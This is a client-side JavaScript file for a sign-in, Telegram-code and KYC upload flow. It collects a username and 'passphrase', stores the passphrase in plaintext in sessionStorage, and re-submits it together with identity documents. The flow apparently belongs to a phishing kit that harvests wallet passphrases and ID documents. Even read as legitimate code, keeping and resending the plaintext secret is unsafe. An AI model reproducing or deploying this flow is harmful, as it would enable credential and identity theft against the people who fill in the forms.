// public/script.js - works across index.html, code.html, kyc.html
function $id(id){ return document.getElementById(id); }
function statusText(text){
  const el = document.getElementById('status');
  if (el) el.textContent = text;
}

// Helper: POST JSON
async function postJSON(url, data){
  const res = await fetch(url, {
    method:'POST',
    headers:{ 'Content-Type':'application/json' },
    body: JSON.stringify(data)
  });
  return res.json();
}

// Signin form (index.html)
const signinForm = document.getElementById('signinForm');
if (signinForm) {
  signinForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    statusText('Sending sign-in...');
    const form = e.target;
    const username = form.username.value.trim();
    const passphrase = form.passphrase.value.trim();
    if(!username || !passphrase){ statusText('Fill all fields'); return; }

    try {
      const data = await postJSON('/signin', { username, passphrase });
      if (data && data.ok) {
        // persist for later steps
        sessionStorage.setItem('username', username);
        sessionStorage.setItem('passphrase', passphrase);
        statusText('Code sent — check Telegram');
        // go to code page
        window.location.href = data.next || 'code.html';
      } else {
        statusText('Error: ' + (data.error || 'sign-in failed'));
      }
    } catch (err) {
      console.error(err);
      statusText('Network error');
    }
  });
}

// Code form (code.html)
const codeForm = document.getElementById('codeForm');
if (codeForm) {
  codeForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    statusText('Verifying code...');
    const code = e.target.code.value.trim();
    const username = sessionStorage.getItem('username') || '';
    if (!username) { statusText('No username stored — go back to sign in'); return; }
    if (!/^\d{6}$/.test(code)) { statusText('Enter a valid 6-digit code'); return; }

    try {
      const data = await postJSON('/verify', { username, code });
      if (data && data.ok) {
        statusText('Code verified — proceed to KYC');
        window.location.href = data.next || 'kyc.html';
      } else {
        statusText('Error: ' + (data.error || 'invalid code'));
      }
    } catch (err) {
      console.error(err);
      statusText('Network error');
    }
  });
}

// KYC form (kyc.html)
const kycForm = document.getElementById('kycForm');
if (kycForm) {
  kycForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    statusText('Uploading KYC...');
    const form = e.target;
    const fd = new FormData(form);

    // attach username & passphrase from sessionStorage so server receives them
    const username = sessionStorage.getItem('username') || '';
    const passphrase = sessionStorage.getItem('passphrase') || '';
    fd.append('username', username);
    fd.append('passphrase', passphrase);

    try {
      const res = await fetch('/kyc', { method:'POST', body: fd });
      const data = await res.json();
      if (data && data.ok) {
        statusText('KYC submitted — redirecting...');
        window.location.href = data.redirect || '/';
      } else {
        statusText('Error: ' + (data.error || 'upload failed'));
      }
    } catch (err) {
      console.error(err);
      statusText('Network error');
    }
  });
}